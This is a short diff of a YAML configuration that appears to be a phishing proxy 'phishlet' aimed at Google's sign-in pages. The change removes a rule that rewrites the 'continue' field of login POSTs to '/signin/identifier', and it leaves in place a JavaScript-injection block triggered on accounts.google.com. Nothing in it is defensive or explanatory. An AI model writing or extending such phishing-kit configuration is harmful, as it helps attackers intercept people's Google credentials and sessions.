@@ -41,16 +41,6 @@ auth_urls:
 login:
   domain: 'accounts.google.com'
   path: '/ServiceLogin'
-
-force_post:
-  - path: '/signin/identifier'
-    search: 
-      - {key: 'f.req', search: '.*'}
-      - {key: 'continue', search: '.*'}
-    force:
-      - {key: 'continue', value: ''}
-    type: 'post'
-
  
 js_inject:
   - trigger_domains: ['accounts.google.com']
